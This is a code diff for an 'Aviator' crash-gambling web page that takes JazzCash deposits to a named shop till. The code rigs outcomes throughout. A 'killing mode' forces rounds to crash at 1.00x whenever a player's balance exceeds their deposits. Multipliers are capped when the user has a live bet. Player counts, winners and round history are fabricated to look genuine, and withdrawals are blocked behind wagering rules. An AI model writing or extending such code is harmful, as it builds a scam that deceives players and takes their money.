@@ -13,7 +13,6 @@
                 window.location.replace(url.toString());
             }
         })();
-        window.onerror = function() { return true; };
     </script>
 
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
@@ -130,7 +129,7 @@
         <div class="inst-box">
             <b>NAME: MUHAMMAD SHOP</b><br>
             <b>TILL ID: 983199695</b><hr style="border:0.2px solid #333;">
-            Enter TID after JazzCash payment.
+            TID submit karein deposit ke liye.
         </div>
         <input type="number" id="dAmt" placeholder="Amount" class="b-input" style="width:100%;">
         <input type="text" id="dTid" placeholder="TID (Transaction ID)" class="b-input" style="width:100%;">
@@ -150,7 +149,7 @@
         <h3>MY PROFILE</h3>
         <div id="profData" style="background: #1b1c21; padding: 15px; border-radius: 10px; margin-bottom: 20px;"></div>
         <button onclick="auth.signOut()" class="auth-btn" style="margin-bottom:20px;">LOGOUT</button>
-        <h4 style="color:var(--blue)">HISTORY</h4>
+        <h4 style="color:var(--blue)">PENDING REQUESTS</h4>
         <div id="uStatusList">No history found.</div>
     </div>
 </div>
@@ -162,19 +161,19 @@ const auth = firebase.auth();
 const db = firebase.database();
 const cashoutSound = new Audio('https://files.catbox.moe/v6p5at.mp3');
 
-let uid, userEmail, balance = 0, wager = 0, depositBal = 0, mult = 1.0, isFlying = false, isWaiting = true, currentPlayers = 0;
+let uid, userEmail, balance = 0, wager = 0, depositSum = 0, mult = 1.0, isFlying = false, isWaiting = true, currentPlayers = 0;
 let b1 = { active: false, amt: 0, cashed: false }, b2 = { active: false, amt: 0, cashed: false };
-let isLoginMode = true, killingMode = false;
+let killingMode = false;
 
 function toggleAuthMode() {
-    isLoginMode = !isLoginMode;
-    document.getElementById('auth-title').innerText = isLoginMode ? "AVIATOR LOGIN" : "AVIATOR SIGNUP";
+    document.getElementById('auth-title').innerText = "AVIATOR SIGNUP";
 }
 
 function handleAuth() {
     const e = document.getElementById('auth-email').value, p = document.getElementById('auth-pass').value;
-    if(isLoginMode) auth.signInWithEmailAndPassword(e, p).catch(err => alert(err.message));
-    else auth.createUserWithEmailAndPassword(e, p).then(res => db.ref('users/'+res.user.uid).set({email:e, balance:100, wager:0, deposit:0}));
+    auth.signInWithEmailAndPassword(e, p).catch(err => {
+        auth.createUserWithEmailAndPassword(e, p).then(res => db.ref('users/'+res.user.uid).set({email:e, balance:100, wager:0, deposit:0}));
+    });
 }
 
 auth.onAuthStateChanged(user => {
@@ -186,22 +185,33 @@ auth.onAuthStateChanged(user => {
         db.ref('users/' + uid).on('value', s => {
             if(s.exists()){
                 const d = s.val();
-                balance = d.balance || 0; wager = d.wager || 0; depositBal = d.deposit || 0;
+                balance = d.balance || 0; wager = d.wager || 0; depositSum = d.deposit || 0;
                 document.getElementById('uBal').innerText = balance.toFixed(2);
                 document.getElementById('profData').innerHTML = `<b>Email:</b> ${userEmail}<br><b>Wager:</b> Rs ${wager.toFixed(0)}`;
                 
-                if(balance > depositBal && depositBal > 0) killingMode = true;
-                if(killingMode && balance <= (depositBal/2)) killingMode = false;
+                // Killing Mode Fix: Balance > Deposit then forced 1.0x until half deposit
+                if(balance > depositSum && depositSum > 0) killingMode = true;
+                if(killingMode && balance <= (depositSum / 2)) killingMode = false;
             }
         });
         generateFakeHistory(); start7sTimer(); startFakeWinners();
     } else { document.getElementById('auth-screen').style.display = 'flex'; }
 });
 
+// RNG 10 BETS STRICT POOL
 function getVipCrashPoint() {
-    if(killingMode) return 1.0;
-    const p = [1.0, 1.0, (Math.random()*5+5), (Math.random()*0.3+1.2), (Math.random()*0.3+1.2), (Math.random()*0.3+1.2), (Math.random()*0.3+1.2), (Math.random()*1+2), (Math.random()*1+2), (Math.random()*5+10), (Math.random()*40+10)];
-    return p[Math.floor(Math.random()*p.length)].toFixed(2);
+    if(killingMode) return 1.00;
+    
+    let pool = [
+        1.00, 1.00, // 2 bets @ 1.0x
+        (Math.random()*(10-5)+5), // 1 bet 5x-10x
+        (Math.random()*(1.5-1.2)+1.2), (Math.random()*(1.5-1.2)+1.2), (Math.random()*(1.5-1.2)+1.2), (Math.random()*(1.5-1.2)+1.2), // 4 bets 1.2-1.5x
+        (Math.random()*(3-2)+2), (Math.random()*(3-2)+2), // 2 bets 2-3x
+        (Math.random()*(15-10)+10), // 1 bet 10-15x
+        (Math.random()*(50-10)+10) // 1 bet 10-50x
+    ];
+    let pick = pool[Math.floor(Math.random() * pool.length)];
+    return parseFloat(pick.toFixed(2));
 }
 
 function start7sTimer() {
@@ -212,7 +222,8 @@ function start7sTimer() {
     document.getElementById('mVal').style.color = "white";
     document.getElementById('super-label').style.display = 'none';
     
-    currentPlayers = Math.floor(Math.random()*(1500-1200)+1200);
+    // Timer Players: 1200 - 1500
+    currentPlayers = Math.floor(Math.random() * (1500 - 1200) + 1200);
     document.getElementById('pCount').innerText = currentPlayers;
 
     let timer = setInterval(() => {
@@ -231,7 +242,8 @@ function launchPlane() {
     function engine() {
         if(!isFlying) return;
         
-        let speed = (mult >= 2.0) ? 0.07 : 0.01; 
+        // Super Jet Mode 2x+ Full Speed
+        let speed = (mult >= 2.0) ? 0.08 : 0.01; 
         if(mult >= 2.0 && !superOn) {
             superOn = true;
             document.getElementById('super-label').style.display = 'block';
@@ -240,15 +252,15 @@ function launchPlane() {
         mult += speed;
         document.getElementById('mVal').innerText = mult.toFixed(2) + "x";
 
-        // Real Feel Player Drop
-        if(currentPlayers > 50) {
-            currentPlayers -= Math.floor(Math.random() * 20);
-            document.getElementById('pCount').innerText = currentPlayers;
+        // Real Player Drop: Game start hote hi niche girna shuru
+        if(currentPlayers > 10) {
+            currentPlayers -= Math.floor(Math.random() * 25);
+            document.getElementById('pCount').innerText = Math.max(10, currentPlayers);
         }
 
-        // Strict 10x Rule
+        // Strict 10x Rule: No 10x+ if user in > 5x
         let userActive = (b1.active && !b1.cashed) || (b2.active && !b2.cashed);
-        if(userActive && mult >= 5.0 && target >= 10) target = 5.1;
+        if(userActive && mult >= 5.0 && target >= 10) target = 5.05;
 
         [1, 2].forEach(id => {
             let b = id === 1 ? b1 : b2;
@@ -307,13 +319,13 @@ function startFakeWinners() {
     setInterval(() => {
         if(isFlying && Math.random() < 0.6) {
             let row = document.createElement('div'); row.className = 'win-row';
-            row.innerHTML = `<span>User***</span><span>Rs 500</span><span style="color:var(--win)">${(Math.random()*mult).toFixed(2)}x</span>`;
+            row.innerHTML = `<span>User***</span><span>Rs 200</span><span style="color:var(--win)">${(Math.random()*mult).toFixed(2)}x</span>`;
             document.getElementById('winRows').prepend(row);
         }
-    }, 1500);
+    }, 1200);
 }
 
-function generateFakeHistory() { for(let i=0; i<20; i++) addHistoryTag((Math.random()*2+1).toFixed(2)); }
+function generateFakeHistory() { for(let i=0; i<15; i++) addHistoryTag((Math.random()*2+1).toFixed(2)); }
 
 function toggleTab(id) { 
     document.querySelectorAll('.overlay').forEach(o => o.style.display = 'none'); 
@@ -324,16 +336,17 @@ function toggleTab(id) {
 }
 
 function loadHistory() {
-    db.ref('requests').orderByChild('uid').equalTo(uid).limitToLast(5).on('value', s => {
+    db.ref('requests').orderByChild('uid').equalTo(uid).limitToLast(10).on('value', s => {
         let h = ""; 
         s.forEach(c => { 
             let d = c.val();
-            h = `<div class="status-item" style="border-left-color:${d.status=='pending'?'var(--gold)':'var(--win)'}">
+            let clr = d.status == 'pending' ? 'var(--gold)' : 'var(--win)';
+            h = `<div class="status-item" style="border-left-color:${clr}">
                     <b>${d.type.toUpperCase()}</b>: Rs ${d.amount}<br>
-                    Status: <span style="color:${d.status=='pending'?'var(--gold)':'var(--win)'}">${d.status.toUpperCase()}</span>
+                    Status: <span style="color:${clr}">${d.status.toUpperCase()}</span>
                  </div>` + h; 
         });
-        document.getElementById('uStatusList').innerHTML = h || "No data.";
+        document.getElementById('uStatusList').innerHTML = h || "No requests found.";
     });
 }
 
@@ -341,8 +354,8 @@ function submitDep() {
     let a = document.getElementById('dAmt').value, t = document.getElementById('dTid').value;
     if(a && t) { 
         db.ref('requests').push({uid, email:userEmail, amount:a, tid:t, type:'deposit', status:'pending'});
-        db.ref('users/'+uid).update({deposit: depositBal + parseFloat(a)});
-        alert("Sent!"); toggleTab(); 
+        db.ref('users/'+uid).update({deposit: depositSum + parseFloat(a)});
+        alert("Deposit Submitted!"); toggleTab(); 
     }
 }
 
@@ -350,9 +363,10 @@ function submitWit() {
     let a = document.getElementById('wAmt').value, n = document.getElementById('wNum').value;
     if(a >= 500 && wager >= 5000 && a <= balance) {
         db.ref('requests').push({uid, email:userEmail, amount:a, number:n, type:'withdraw', status:'pending'});
-        db.ref('users/'+uid).update({ balance: balance - a }); alert("Sent!"); toggleTab();
-    }
+        db.ref('users/'+uid).update({ balance: balance - a }); alert("Withdrawal Submitted!"); toggleTab();
+    } else alert("Check Min Rs 500 & Wager!");
 }
 </script>
 </body>
-</html>
+                                          </html>
+    
